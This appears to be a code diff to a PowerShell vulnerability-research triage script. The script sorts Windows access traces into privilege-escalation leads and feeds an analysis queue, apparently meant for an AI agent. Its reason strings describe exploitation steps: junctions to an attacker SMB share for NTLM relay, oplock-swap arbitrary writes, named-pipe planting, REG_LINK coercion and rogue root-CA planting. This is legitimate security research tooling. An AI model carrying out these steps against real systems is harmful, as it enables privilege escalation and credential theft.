-    # has SYSTEM-equivalent surface elsewhere. (b) a filesystem path — you can't
-    # plant an NTFS junction on a registry key. Without these gates the rule
-    # fires on every "privileged process reads anything," producing critical
-    # mislabels on HKLM\HARDWARE reads and similar Admin_To_System candidates.
+    # RULE 3: AutoRun / Script Persistence
     # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and $isPrivileged -and $opDirection -eq "Read" `
-        -and $writableLow -and $isFsPath) {
-        $severity = "Critical"
-        $type = "SMB / NTLM Coercion Candidate"
-        $exploitPrimitive = "SMB_Coercion"
-        $reason = "PRIVILEGED PROCESS ($integrity) reads from a user-writable path. Plant NTFS junction → drive-letter → \\\\attacker\\share via the medium-IL chain (LPE prompt §3.5: DefineDosDevice + mklink /j) to capture/relay Net-NTLMv2. Effective principal: $effectivePrincipal."
-        if ($isNameNotFound) {
-            $reason += " PATH DOES NOT EXIST → trivial to plant junction without race."
-        }
-        if ($anyOpenRP) {
-            $reason += " (Caveat: at least one observed open had Open Reparse Point set — look for OTHER opens missing the flag.)"
-            $severity = "High"
-        }
-        $isDirectLead = $true
-    }
-
-    # ─────────────────────────────────────────────────────────────────────────
-    # RULE 6: Arbitrary Write via Oplock + Junction (LPE prompt §3.5 + §3.7)
-    #
-    # Same gates as Rule 5: low-priv writable + filesystem. The oplock-swap
-    # primitive is the low-priv user holding an exclusive oplock on a directory
-    # they can write, then swapping the contents to an NTFS junction mid-write.
-    # Admin-only-writable paths aren't an LPE surface, and registry keys can't
-    # hold oplocks or NTFS junctions.
-    # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and ($isPrivileged -and $opDirection -eq "Write" -or $anyPrivWrite) `
-        -and $writableLow -and $isFsPath) {
-        $severity = "Critical"
-        $type = "Arbitrary Write via Oplock+Junction"
-        $exploitPrimitive = "Oplock_ArbitraryWrite"
-        $reason = "PRIVILEGED PROCESS ($integrity) WRITES to a user-writable path. Set exclusive oplock on directory → swap NTFS junction mid-write → write lands in arbitrary privileged location (System32, drivers folder, Tasks XML). NO SPECIAL PRIVILEGES REQUIRED. Effective principal: $effectivePrincipal."
-        if ($path -match "\.(tmp|log|cache|dat|bak|old|etl|wer)$") {
-            $reason += " Temp/cache/log file pattern → high likelihood of repeated writes (reliable trigger)."
-        }
-        if ($anyPrivRead -and $anyPrivWrite) {
-            $reason += " BOTH privileged READ and WRITE observed → strong race-window opportunity (TOCTOU between check and consume)."
-        }
-        $isDirectLead = $true
-    }
-
-    # ─────────────────────────────────────────────────────────────────────────
-    # RULE 7: Pipe Planting via Path Redirection
-    #
-    # Already FS-path-gated via the drive-letter regex; adds $writableLow so
-    # the rule doesn't fire on a privileged read of a non-existent path under
-    # an admin-only directory (where a low-priv user couldn't plant the
-    # symlink anyway). Local drive-letter check intentionally kept narrower
-    # than $isFsPath: pipe planting via UNC is a separate primitive class.
-    # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and $isPrivileged -and $isNameNotFound -and $writableLow -and
-        ($path -notmatch "^\\\\\.\\pipe\\") -and ($path -match "^[a-zA-Z]:\\")) {
+    $isPersistenceLocation = ($path -match "(?i)(Startup|\\CurrentVersion\\Run(Once|OnceEx|Services|ServicesOnce)?(\\|$)|\\Windows\\Tasks\\|wbem\\mof|scripts\\(Startup|Logon|Shutdown|Logoff))")
+    $isScriptExt = ($path -match "(?i)\.(bat|ps1|psm1|psd1|vbs|vbe|cmd|wsf|js|jse|wsh)$")
+    if (-not $isDirectLead -and ($writableLow -or $writableMed) -and (
+        $isPersistenceLocation -or ($isScriptExt -and ($isPrivilegedAny -or $anyImpersonating -or $isNameNotFound))
+    )) {
         $severity = "High"
-        $type = "Pipe Planting via Path Redirection"
-        $exploitPrimitive = "Pipe_Plant_Redirect"
-        $reason = "PRIVILEGED PROCESS ($integrity) attempts to open a NON-EXISTENT file path. Plant symlink to named pipe → capture connecting client for NTLM relay. No special privileges needed for relay path."
-        if ($sqos -in @("NotSpecified","Impersonation","Delegation")) {
-            $severity = "Critical"
-            $reason += " SQOS=$sqos → default allows impersonation-level access. SMB relay AND token capture both viable."
-        } elseif ($sqos -eq "Identification") {
-            $reason += " SQOS=Identification → impersonation blocked, but SMB relay still works."
-        } elseif ($sqos -eq "Anonymous") {
-            $severity = "Medium"
-            $reason += " SQOS=Anonymous → DoS / timing side-channel only."
-        }
+        $type = "AutoRun / Script Persistence"
+        $exploitPrimitive = "AutoRun_Persistence"
+        $reason = "Writable script file or persistence location. Likely executed on boot/logon or by a privileged/impersonating task. No privileges needed to modify."
         $isDirectLead = $true
     }
 
     # ─────────────────────────────────────────────────────────────────────────
-    # RULE 8: Config Poisoning — Structured Detection
+    # RULE 8: Config Poisoning — Structured Detection (placed BEFORE generic
+    # Rule 5/6/7 path-redirection rules so privileged reads of .config/.xml/.json
+    # by framework hosts classify as Config_Poison rather than SMB_Coercion)
     # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and $path -match "\.(config|xml|json|yml|yaml)$") {
+    if (-not $isDirectLead -and ($writableLow -or $writableMed -or ($writableHigh -and $isPrivilegedAny)) -and $path -match "\.(config|xml|json|yml|yaml)$") {
         $isFrameworkHost = $false
         foreach ($fh in $frameworkHosts) {
             if ($procs -match "(?i)\b$([regex]::Escape($fh))\b") { $isFrameworkHost = $true; break }
@@ -808,25 +757,11 @@ foreach ($entry in $rawData) {
     }
 
     # ─────────────────────────────────────────────────────────────────────────
-    # RULE 10: Registry Path Coercion via REG_LINK
+    # RULE 9: Certificate / Crypto Store Planting (placed BEFORE generic
+    # Rule 5/6/7 path-redirection rules so privileged cert reads/writes classify
+    # as Cert_Plant rather than SMB_Coercion)
     # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and $isPrivileged -and ($path -match "^HKCU" -or $path -match "^HKEY_CURRENT_USER" -or $path -match "^HKU\\" -or $path -match "^HKEY_USERS\\")) {
-        if (-not $openLink) {
-            $severity = "Critical"
-            $type = "Registry Path Coercion Candidate"
-            $exploitPrimitive = "Registry_Coercion"
-            $reason = "PRIVILEGED PROCESS ($integrity) accesses a user-writable registry key without REG_OPTION_OPEN_LINK. Plant a REG_LINK redirecting elsewhere in the user's hive. NO SPECIAL PRIVILEGES REQUIRED. Effective principal: $effectivePrincipal."
-            if ($anyImpersonating) {
-                $reason += " Impersonation context observed → consumer is reading USER's hive while running as user — classic CVE-2014-6322 archetype."
-            }
-            $isDirectLead = $true
-        }
-    }
-
-    # ─────────────────────────────────────────────────────────────────────────
-    # RULE 9: Certificate / Crypto Store Planting
-    # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and ($path -match "\.(cer|crt|pfx|p12|pem|key|p7b)$" -or
+    if (-not $isDirectLead -and ($writableLow -or $writableMed -or ($writableHigh -and $isPrivilegedAny)) -and ($path -match "\.(cer|crt|pfx|p12|pem|key|p7b)$" -or
         $path -match "(?i)(Crypto\\Keys|Certificate|PKI|AuthRoot|ROOT\\Certificates|SystemCertificates\\Root)")) {
         $severity = "High"
         $type = "Certificate / Crypto Store Planting"
@@ -834,33 +769,120 @@ foreach ($entry in $rawData) {
         $reason = "Writable certificate or crypto store path. Plant trusted root CA to enable MitM, or inject code-signing cert to bypass signature checks. No privileges needed to write."
         if ($isPrivileged) {
             $severity = "Critical"
-            $reason += " CONSUMED BY PRIVILEGED PROCESS ($integrity) → system-wide trust manipulation."
+            $reason += " CONSUMED BY PRIVILEGED PROCESS ($effectiveIntegrity) → system-wide trust manipulation."
         }
         $isDirectLead = $true
+    }
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # RULE 7: Pipe Planting via Path Redirection (placed BEFORE Rule 5 so
+    # missing local paths with explicit SQOS levels are not shadowed by Rule 5)
+    # ─────────────────────────────────────────────────────────────────────────
+    if (-not $isDirectLead -and $isPrivileged -and $isNameNotFound -and $writableLow -and
+        ($path -notmatch "^\\\\\.\\pipe\\") -and ($path -match "^[a-zA-Z]:\\") -and ($sqos -ne "NotSpecified")) {
+        $severity = "High"
+        $type = "Pipe Planting via Path Redirection"
+        $exploitPrimitive = "Pipe_Plant_Redirect"
+        $reason = "PRIVILEGED PROCESS ($effectiveIntegrity) attempts to open a NON-EXISTENT file path with explicit SQOS. Plant symlink to named pipe → capture connecting client for NTLM relay or token impersonation. Effective principal: $effectivePrincipal."
+        if ($sqos -in @("Impersonation","Delegation")) {
+            $severity = "Critical"
+            $reason += " SQOS=$sqos → allows impersonation-level access. SMB relay AND token capture both viable."
+        } elseif ($sqos -eq "Identification") {
+            $reason += " SQOS=Identification → impersonation blocked, but SMB relay still works."
+        } elseif ($sqos -eq "Anonymous") {
+            $severity = "Medium"
+            $reason += " SQOS=Anonymous → DoS / timing side-channel only."
+        }
+        $isDirectLead = $true
+    }
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # RULE 5: SMB / NTLM Coercion via Path Redirection (LPE prompt §3.5)
+    #
+    # Gating: requires (a) a low-priv writable path — the entire exploit is a
+    # low-priv user planting an NTFS junction → drive-letter → \\attacker\share,
+    # so admin-only-writable paths can't trigger this primitive; admin already
+    # has SYSTEM-equivalent surface elsewhere. (b) a filesystem path — you can't
+    # plant an NTFS junction on a registry key.
+    # ─────────────────────────────────────────────────────────────────────────
+    if (-not $isDirectLead -and $isPrivileged -and $opDirection -eq "Read" `
+        -and $writableLow -and $isFsPath) {
+        $severity = "Critical"
+        $type = "SMB / NTLM Coercion Candidate"
+        $exploitPrimitive = "SMB_Coercion"
+        $reason = "PRIVILEGED PROCESS ($effectiveIntegrity) reads from a user-writable path. Plant NTFS junction → drive-letter → \\\\attacker\\share via the medium-IL chain (LPE prompt §3.5: DefineDosDevice + mklink /j) to capture/relay Net-NTLMv2. Effective principal: $effectivePrincipal."
+        if ($isNameNotFound) {
+            $reason += " PATH DOES NOT EXIST → trivial to plant junction or pipe-symlink redirect (Pipe_Plant_Redirect) without race."
+        }
+        if ($anyOpenRP) {
+            $reason += " (Caveat: at least one observed open had Open Reparse Point set — look for OTHER opens missing the flag.)"
+            $severity = "High"
+        }
+        $isDirectLead = $true
+    }
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # RULE 6: Arbitrary Write via Oplock + Junction (LPE prompt §3.5 + §3.7)
+    # ─────────────────────────────────────────────────────────────────────────
+    if (-not $isDirectLead -and ($isPrivileged -and $opDirection -eq "Write" -or $anyPrivWrite) `
+        -and $writableLow -and $isFsPath) {
+        $severity = "Critical"
+        $type = "Arbitrary Write via Oplock+Junction"
+        $exploitPrimitive = "Oplock_ArbitraryWrite"
+        $reason = "PRIVILEGED PROCESS ($effectiveIntegrity) WRITES to a user-writable path. Set exclusive oplock on directory → swap NTFS junction mid-write → write lands in arbitrary privileged location (System32, drivers folder, Tasks XML). NO SPECIAL PRIVILEGES REQUIRED. Effective principal: $effectivePrincipal."
+        if ($path -match "\.(tmp|log|cache|dat|bak|old|etl|wer)$") {
+            $reason += " Temp/cache/log file pattern → high likelihood of repeated writes (reliable trigger)."
+        }
+        if ($anyPrivRead -and $anyPrivWrite) {
+            $reason += " BOTH privileged READ and WRITE observed → strong race-window opportunity (TOCTOU between check and consume)."
+        }
+        $isDirectLead = $true
+    }
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # RULE 10: Registry Path Coercion via REG_LINK
+    # ─────────────────────────────────────────────────────────────────────────
+    if (-not $isDirectLead -and $isPrivileged -and ($writableLow -or $writableMed) -and ($path -match "^HKCU" -or $path -match "^HKEY_CURRENT_USER" -or $path -match "^HKU\\" -or $path -match "^HKEY_USERS\\")) {
+        if (-not $allOpenLink) {
+            $severity = "Critical"
+            $type = "Registry Path Coercion Candidate"
+            $exploitPrimitive = "Registry_Coercion"
+            $reason = "PRIVILEGED PROCESS ($effectiveIntegrity) accesses a user-writable registry key without REG_OPTION_OPEN_LINK. Plant a REG_LINK redirecting elsewhere in the user's hive. NO SPECIAL PRIVILEGES REQUIRED. Effective principal: $effectivePrincipal."
+            if ($anyImpersonating) {
+                $reason += " Impersonation context observed → consumer is reading USER's hive while running as user — classic CVE-2014-6322 archetype."
+            }
+            if ($anyOpenLink) {
+                $reason += " (Caveat: at least one observed open used REG_OPTION_OPEN_LINK — target an open that omits the flag.)"
+                $severity = "High"
+            }
+            $isDirectLead = $true
+        }
     }
 
     # ─────────────────────────────────────────────────────────────────────────
     # LOLBin cross-reference (extension-aware)
     # ─────────────────────────────────────────────────────────────────────────
     $extension = if ($path -match '\.[A-Za-z0-9]{1,6}$') { $matches[0].ToLowerInvariant() } else { "" }
-    foreach ($bin in $lolBinExtensions.Keys) {
-        if ($procs -match "(?i)\b$([regex]::Escape($bin))\b") {
-            $supportedExts = $lolBinExtensions[$bin]
-            $extensionMatches = ($supportedExts.Count -eq 0) -or ($supportedExts -contains $extension)
-            if (-not $extensionMatches) { continue }
+    if ($writableLow -or $writableMed -or ($writableHigh -and $isPrivilegedAny)) {
+        foreach ($bin in $lolBinExtensions.Keys) {
+            if ($procs -match "(?i)\b$([regex]::Escape($bin))\b") {
+                $supportedExts = $lolBinExtensions[$bin]
+                $extensionMatches = ($supportedExts.Count -eq 0) -or ($supportedExts -contains $extension)
+                if (-not $extensionMatches) { continue }
 
-            if ($severity -eq "Low") { $severity = "Medium" }
-            elseif ($severity -eq "Medium") { $severity = "High" }
+                if ($severity -eq "Low") { $severity = "Medium" }
+                elseif ($severity -eq "Medium") { $severity = "High" }
 
-            if ($isDirectLead) {
-                $reason += " -> INTERACTED WITH LOLBIN: $bin (severity escalated, extension '$extension' is consumable by $bin)"
-            } else {
-                $type = "LOLBin Proxy Target"
-                $exploitPrimitive = "LOLBin_Proxy"
-                $reason = "File ($extension) queried by $bin — a known proxy-execution LOLBin for this extension. Re-confirm parsing path before claiming RCE; some LOLBins parse only specific embedded constructs (e.g. msbuild needs an embedded '<Target>' element with a '<Tasks.Code>' task)."
-                $isDirectLead = $true
+                if ($isDirectLead) {
+                    $reason += " -> INTERACTED WITH LOLBIN: $bin (severity escalated, extension '$extension' is consumable by $bin)"
+                } else {
+                    $type = "LOLBin Proxy Target"
+                    $exploitPrimitive = "LOLBin_Proxy"
+                    $reason = "File ($extension) queried by $bin — a known proxy-execution LOLBin for this extension. Re-confirm parsing path before claiming RCE; some LOLBins parse only specific embedded constructs (e.g. msbuild needs an embedded '<Target>' element with a '<Tasks.Code>' task)."
+                    $isDirectLead = $true
+                }
+                break
             }
-            break
         }
     }
 
@@ -868,6 +890,52 @@ foreach ($entry in $rawData) {
     # COGNITIVE QUEUE — items that need agent semantic analysis
     # ─────────────────────────────────────────────────────────────────────────
     if (-not $isDirectLead) {
+        if ($isFsPath -and ($writableLow -or $writableMed) -and (-not $isPrivilegedAny) -and $path -match "(?i)\.(dll|exe|sys|drv|ocx|cpl|ax|ps1|psm1|psd1|bat|cmd|vbs|js|wsf|hta|jar|war|node|pyd|so)$") {
+            # Branch 4 (rev 3.2/3.3): persistence-class binary/script in a
+            # writable location with no privileged actor observed in THIS
+            # trace. Evaluated before the user-only noise drop so latent
+            # persistence/supply-chain binaries are preserved.
+            $hint = "Persistence / supply-chain binary candidate. Writable executable or script in a $writableFrom-writable location; no privileged consumer was observed in this trace, but the file may still be loaded later by a privileged process (service startup, scheduled task, AV scan with engine load, dependency resolution) or trigger on user action."
+            $hint += " Check: (1) is this binary referenced by a service ImagePath / scheduled-task action / Run key / Startup folder; (2) does a higher-IL process load this directory on demand (DLL search-order, Authenticode-signed loader); (3) for scripts, is this auto-loaded on shell start / user logon / explorer interaction."
+            if ($anyWrite -and $anyRead) {
+                $hint += " NOTE: BOTH read and write observed → race-window candidate if a privileged consumer joins later."
+            } elseif ($opDirection -eq "Write") {
+                $hint += " NOTE: Process WRITES this binary → if a privileged consumer loads it before next overwrite, you have a code-exec primitive."
+            }
+            $cognitiveQueue.Add([PSCustomObject]@{
+                Path = $path
+                Processes = $procs
+                Operations = $operations
+                Hint = $hint
+                TraceFile = (Get-FieldValue $entry "TraceFile")
+                Timestamp = (Get-FieldValue $entry "Timestamp")
+                Operation = $operation
+                Result = $result
+                Detail = $detail
+                Integrity = $effectiveIntegrity
+                Impersonating = $impersonating
+                OperationDirection = $opDirection
+                SqosLevel = $sqos
+                EffectivePrincipal = $effectivePrincipal
+                WritableFrom = $writableFrom
+                AnyPrivRead  = $anyPrivRead
+                AnyPrivWrite = $anyPrivWrite
+                OpenReparsePoint = $openRP
+                OpenLink = $openLink
+                FilterReason = "PersistenceBinary_NoPrivilegedConsumer"
+            })
+            continue
+        }
+
+        # LPE §9: "user-already-has-it" — when no direct primitive rule matched
+        # and the path is not a persistence binary, drop entries where the only
+        # consumer is the current user's own session with no privileged or
+        # impersonating actor.
+        if ($isUserOnly -and (-not $isPrivilegedAny) -and (-not $anyImpersonating)) {
+            $dropUserOnly++
+            continue
+        }
+
         if ($path -match "\.(config|xml|ini|json|yml|yaml|txt|log|db|dat|reg|inf|pol|asar|md|csv)$" -or $path -match "^HK") {
             $hint = "Requires semantic analysis. "
             if ($isPrivilegedAny) {
@@ -892,7 +960,7 @@ foreach ($entry in $rawData) {
                 Operation = $operation
                 Result = $result
                 Detail = $detail
-                Integrity = $integrity
+                Integrity = $effectiveIntegrity
                 Impersonating = $impersonating
                 OperationDirection = $opDirection
                 SqosLevel = $sqos
@@ -913,7 +981,7 @@ foreach ($entry in $rawData) {
                 Operation = $operation
                 Result = $result
                 Detail = $detail
-                Integrity = $integrity
+                Integrity = $effectiveIntegrity
                 Impersonating = $impersonating
                 OperationDirection = $opDirection
                 SqosLevel = $sqos
@@ -924,13 +992,6 @@ foreach ($entry in $rawData) {
                 OpenLink = $openLink
             })
         } elseif ($isPrivilegedAny -and $isFsPath) {
-            # Catch-all for privileged-actor reads/writes on FS paths the prior
-            # two branches missed: ProgramData, non-system drives, third-party
-            # install paths, UNC. After the Rule 5/6/7 writability+FS gates
-            # these entries would otherwise vanish; preserve them as
-            # Admin_To_System / UAC_Bypass / supply-chain research candidates,
-            # perspective-tagged so the analyst knows what writability level
-            # they'd need to weaponize.
             $writabilityNote = if ($writableLow) {
                 "low-priv-writable"
             } elseif ($writableMed) {
@@ -956,7 +1017,7 @@ foreach ($entry in $rawData) {
                 Operation = $operation
                 Result = $result
                 Detail = $detail
-                Integrity = $integrity
+                Integrity = $effectiveIntegrity
                 Impersonating = $impersonating
                 OperationDirection = $opDirection
                 SqosLevel = $sqos
@@ -967,48 +1028,6 @@ foreach ($entry in $rawData) {
                 OpenReparsePoint = $openRP
                 OpenLink = $openLink
                 FilterReason = "PrivilegedActor_NoRuleMatched"
-            })
-        } elseif ($isFsPath -and $path -match "(?i)\.(dll|exe|sys|drv|ocx|cpl|ax|ps1|psm1|psd1|bat|cmd|vbs|js|wsf|hta|jar|war|node|pyd|so)$") {
-            # Branch 4 (rev 3.2): persistence-class binary/script in a
-            # writable location with no privileged actor observed in THIS
-            # trace. Used to vanish entirely — the prior branches required
-            # either config-extension semantics, registry path, or a
-            # privileged consumer in scope. These leads are real research
-            # surfaces even without a privileged consumer:
-            #   * Persistence vectors (Startup, auto-loaded module, Run keys)
-            #   * Supply-chain plants (a vendor binary an SCCM/Defender pkg
-            #     might eventually load privileged)
-            #   * Latent LPE — privileged consumer not in trace window but
-            #     known from the path's role (e.g. .dll in a service's
-            #     install dir)
-            $hint = "Persistence / supply-chain binary candidate. Writable executable or script in a $writableFrom-writable location; no privileged consumer was observed in this trace, but the file may still be loaded later by a privileged process (service startup, scheduled task, AV scan with engine load, dependency resolution) or trigger on user action."
-            $hint += " Check: (1) is this binary referenced by a service ImagePath / scheduled-task action / Run key / Startup folder; (2) does a higher-IL process load this directory on demand (DLL search-order, Authenticode-signed loader); (3) for scripts, is this auto-loaded on shell start / user logon / explorer interaction."
-            if ($anyWrite -and $anyRead) {
-                $hint += " NOTE: BOTH read and write observed → race-window candidate if a privileged consumer joins later."
-            } elseif ($opDirection -eq "Write") {
-                $hint += " NOTE: Process WRITES this binary → if a privileged consumer loads it before next overwrite, you have a code-exec primitive."
-            }
-            $cognitiveQueue.Add([PSCustomObject]@{
-                Path = $path
-                Processes = $procs
-                Operations = $operations
-                Hint = $hint
-                TraceFile = (Get-FieldValue $entry "TraceFile")
-                Timestamp = (Get-FieldValue $entry "Timestamp")
-                Operation = $operation
-                Result = $result
-                Detail = $detail
-                Integrity = $integrity
-                Impersonating = $impersonating
-                OperationDirection = $opDirection
-                SqosLevel = $sqos
-                EffectivePrincipal = $effectivePrincipal
-                WritableFrom = $writableFrom
-                AnyPrivRead  = $anyPrivRead
-                AnyPrivWrite = $anyPrivWrite
-                OpenReparsePoint = $openRP
-                OpenLink = $openLink
-                FilterReason = "PersistenceBinary_NoPrivilegedConsumer"
             })
         }
     } else {
@@ -1023,7 +1042,7 @@ foreach ($entry in $rawData) {
         # consumer integrity. Drives downstream research-prompt routing.
         $escalationCategory = Get-EscalationCategory `
             -writableFrom $writableFrom `
-            -consumerIntegrity $integrity `
+            -consumerIntegrity $effectiveIntegrity `
             -primitive $exploitPrimitive `
             -anyImpersonating $anyImpersonating
         $promptId = Get-ResearchPromptIdForCategory -category $escalationCategory -primitive $exploitPrimitive
@@ -1041,7 +1060,7 @@ foreach ($entry in $rawData) {
                 Operation = $operation
                 Result = $result
                 Detail = $detail
-                Integrity = $integrity
+                Integrity = $effectiveIntegrity
                 Impersonating = $impersonating
                 OperationDirection = $opDirection
                 SqosLevel = $sqos
@@ -1071,11 +1090,16 @@ foreach ($entry in $rawData) {
             OperationDirection = $opDirection
             Result = $result
             Detail = $detail
-            Integrity = $integrity
+            Integrity = $effectiveIntegrity
+            HighestIntegrity = $highestIntegrity
             Impersonating = $impersonating
             SqosLevel = $sqos
             OpenReparsePoint = $openRP
             OpenLink = $openLink
+            AnyOpenReparsePoint = $anyOpenRP
+            AllOpenReparsePoint = $allOpenRP
+            AnyOpenLink = $anyOpenLink
+            AllOpenLink = $allOpenLink
             AnyPrivRead  = $anyPrivRead
             AnyPrivWrite = $anyPrivWrite
             AnyImpersonating = $anyImpersonating
@@ -1093,14 +1117,21 @@ foreach ($entry in $rawData) {
 # OUTPUT
 # ═══════════════════════════════════════════════════════════════════════════════
 
-$hardcodedJsonPath = Join-Path $feedDir "high_confidence_leads.json"
-$cognitiveJsonPath = Join-Path $feedDir "cognitive_review_queue.json"
-
 $severityOrder = @{ "Critical" = 1; "High" = 2; "Medium" = 3; "Low" = 4; "Unknown" = 5 }
-$sortedLeads = $hardcodedLeads | Sort-Object { $severityOrder[$_.Severity] }
+$sortedLeads = @($hardcodedLeads | Sort-Object { $severityOrder[$_.Severity] })
+$cognitiveArr = @($cognitiveQueue)
 
-$sortedLeads | ConvertTo-Json -Depth 4 | Out-File $hardcodedJsonPath -Encoding UTF8
-$cognitiveQueue | ConvertTo-Json -Depth 4 | Out-File $cognitiveJsonPath -Encoding UTF8
+if ($sortedLeads.Count -eq 0) {
+    "[]" | Out-File $hardcodedJsonPath -Encoding UTF8
+} else {
+    ConvertTo-Json -InputObject $sortedLeads -Depth 4 | Out-File $hardcodedJsonPath -Encoding UTF8
+}
+
+if ($cognitiveArr.Count -eq 0) {
+    "[]" | Out-File $cognitiveJsonPath -Encoding UTF8
+} else {
+    ConvertTo-Json -InputObject $cognitiveArr -Depth 4 | Out-File $cognitiveJsonPath -Encoding UTF8
+}
 
 $primitiveStats = $hardcodedLeads | Group-Object ExploitPrimitive | Sort-Object Count -Descending
 $categoryStats  = $hardcodedLeads | Group-Object EscalationCategory | Sort-Object Count -Descending
